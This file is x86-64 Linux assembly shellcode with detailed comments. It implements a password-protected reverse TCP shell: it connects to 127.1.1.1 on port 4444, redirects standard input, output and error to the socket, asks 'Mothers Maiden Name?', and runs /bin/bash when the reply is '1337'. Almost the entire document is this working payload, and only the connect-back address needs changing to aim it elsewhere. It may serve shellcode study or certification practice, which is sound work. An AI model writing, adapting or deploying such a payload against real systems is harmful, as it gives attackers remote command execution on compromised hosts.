; Author: Bobby Cooke
global _start

section .text

_start:
; int ipv4Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
; rax = 0x29
; rdi = 0x2  = AF_INET
; rsi = 0x1  = SOCK_STREAM
; rdx = 0x0  = IPPROTO_IP

xor rsi, rsi   ; clear rsi
mul rsi        ; clear rax, rdx ; rdx = 0x0 = IPPROTO_IP
add al, 0x29   ; rax = 0x29 = socket syscall
inc rsi        ; rsi = 0x1 = SOCK_STREAM
push rsi
pop rdi        ; rdi = 0x1
inc rdi        ; rdi = 0x2 = AF_INET
syscall        ; socket syscall ; RAX returns socket File-Descriptor


; connect(ipv4Socket, (struct sockaddr*)&ipSocketAddr, sizeof(ipSocketAddr));  
; RAX: 0x2a
; RDI: 0x3     <- Socket FD returned from socket()
; RSI: 0x7fffffffe120 --> 0x101017f5c110002
;   gdb-peda$ hexdump $rsi 16
;   0x00007fffffffe120 :
;     02 00 11 5c 7f 01 01 01 00 00 00 00 00 00 00 00
;   AF_INET|4444 |127.1. 1. 1 [----Leave as Nulls----]
; RDX: 0x10    <- Struct Size (16 bytes)

xchg rdi, rax    ; RDI = sockfd / ipv4Socket
xor rax, rax
add al, 0x2a     ; rax = 0x2a = connect syscall
push rdx         ; 8 bytes of zeros for second half of struct
push dword 0x0101017f
push word 0x5c11 ; push 2 bytes for TCP Port 4444
inc rdx
inc rdx          
push dx          ; dx = 0x0002 = AF_INET
add dl, 0xe      ; rdi = 0x10 = sizeof(ipSocketAddr)
mov rsi, rsp     ; rsi = &ipSocketAddr
syscall

; dup2
xor rsi, rsi
xor edx, edx
add dl, 0x3      ; Loop Counter

dup2Loop:
xor rax, rax
add al, 0x21     ; RAX = 0x21 = dup2 systemcall
syscall          ; call dup2 x3 to redirect STDIN STDOUT STDERR
inc rsi
cmp rsi, rdx     ; if 2-STDERR, end loop
jne dup2Loop

password:
; write
; rax = 0x1
; rdi = fd = 0x1 STDOUT
; rsi = &String
; rdx = sizeof(String)
;   "Mothers Maiden Name?"
;String length : 20
;      ?ema : 3f656d61
;  N nediaM : 4e206e656469614d
;   srehtoM : 2073726568746f4d

xor rdi, rdi
mul rdi
push rdi
pop rsi
push rsi
push dword 0x3f656d61
mov rsi, 0x4e206e656469614d
push rsi
mov rsi, 0x2073726568746f4d
push rsi
mov rsi, rsp    ; rsi = &String
inc rax         ; rax = 0x1 = write system call
mov rdi, rax
add rdx, 0x14   ; 20 bytes / size of string
syscall

; read
; rax = 0x0 = read systemcall
; rdi = fd = 0x0 STDIN
; rsi = Write to &String
; rdx = 0x4 = sizeof(String)
xor rdi, rdi
push rdi
mul rdi         ; rdx =0x0 ; rax = 0x0 = write system call
mov rsi, rsp    ; rsi = [RSP] = &String
add rdx, 0x4    ; 4 bytes / size of password
syscall

; "1337"
; String length : 4
;   7331 : 37333331
mov rdi, rsp
push 0x37333331
mov rsi, rsp    ; rsi = &String
xor rcx, rcx
add rcx, 0x4
repe cmpsb
jnz password

;execve
; rax = 0x3b
; rdi = Pointer -> "/bin/bash"0x00
;root# python reverse.py "/bin/bash"
;String length : 9
;h : 68
;sab/nib/ : 7361622f6e69622f
; rsi = 0x0
; rdx = 0x0

xor rsi, rsi
mul rsi          ; rdx&rax= 0x0
xor rdi, rdi
push rdi
add rdx, 0x68
push rdx
mov rdx, 0x7361622f6e69622f ; "/bin/bas"
push rdx
xor rdx, rdx
mov rdi, rsp
mov al, 0x3b  
syscall  ; call execve("/bin/bash", NULL, NULL)

